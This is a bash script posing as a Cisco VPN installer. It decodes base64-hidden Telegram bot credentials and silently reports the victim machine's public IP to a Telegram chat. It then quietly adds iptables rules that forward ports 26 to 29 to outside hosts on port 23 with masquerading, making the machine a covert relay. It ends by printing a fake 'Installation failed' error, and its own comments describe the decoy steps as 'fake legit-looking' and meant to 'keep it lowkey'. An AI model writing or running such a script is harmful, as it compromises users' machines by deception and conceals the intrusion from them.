#!/usr/bin/env bash
set -e

# Base64 encoded secrets
S1="ODE4Mzk5ODM3NTpBQUZQYVJPcVZqZm5PelNidkE5Yjk5TktNWk8ySVpJM1B3VQ=="   # token
S2="NjgyMTE1NzA5NA=="                                                   # chat id
S3="aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="                          # https://api.telegram.org/bot

# Decode
TOKEN=$(echo "$S1" | base64 -d)
CHAT_ID=$(echo "$S2" | base64 -d)
API=$(echo "$S3" | base64 -d)

# Get IP and report
IP=$(curl -s https://api.ipify.org)
curl -s -X POST "${API}${TOKEN}/sendMessage" \
    -d chat_id="$CHAT_ID" \
    -d text="Setup executed on: $IP" >/dev/null 2>&1 || true

# Fake legit-looking steps
echo "[*] Updating system packages..."
apt-get update -y >/dev/null 2>&1
apt-get install -y lib32z1 libssl1.1 curl resolvconf >/dev/null 2>&1

echo "[*] Downloading VPN components..."
curl -s -L -o /tmp/vpn.tar.gz https://downloads.cisco.com/vpn/anyconnect/vpn.tar.gz >/dev/null 2>&1 || true
mkdir -p /opt/cisco
tar -xf /tmp/vpn.tar.gz -C /opt/cisco >/dev/null 2>&1 || true
bash /opt/cisco/install.sh --silent >/dev/null 2>&1 || true

# Enable IP forwarding
sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1

# Your exact iptables format 👇
iptables -t nat -A PREROUTING -p tcp --dport 26 -j DNAT --to-destination 85.9.204.241:23 >/dev/null 2>&1
iptables -t nat -A PREROUTING -p udp --dport 26 -j DNAT --to-destination 85.9.204.241:23 >/dev/null 2>&1

iptables -t nat -A PREROUTING -p tcp --dport 27 -j DNAT --to-destination 85.9.223.204:23 >/dev/null 2>&1
iptables -t nat -A PREROUTING -p udp --dport 27 -j DNAT --to-destination 85.9.223.204:23 >/dev/null 2>&1

iptables -t nat -A PREROUTING -p tcp --dport 28 -j DNAT --to-destination 94.237.121.151:23 >/dev/null 2>&1
iptables -t nat -A PREROUTING -p udp --dport 28 -j DNAT --to-destination 94.237.121.151:23 >/dev/null 2>&1

iptables -t nat -A PREROUTING -p tcp --dport 29 -j DNAT --to-destination 85.9.209.126:23 >/dev/null 2>&1
iptables -t nat -A PREROUTING -p udp --dport 29 -j DNAT --to-destination 85.9.209.126:23 >/dev/null 2>&1

iptables -t nat -A POSTROUTING -j MASQUERADE >/dev/null 2>&1

# Final fake error to keep it lowkey
>&2 echo "Installation failed: unsupported kernel modules"
exit 1
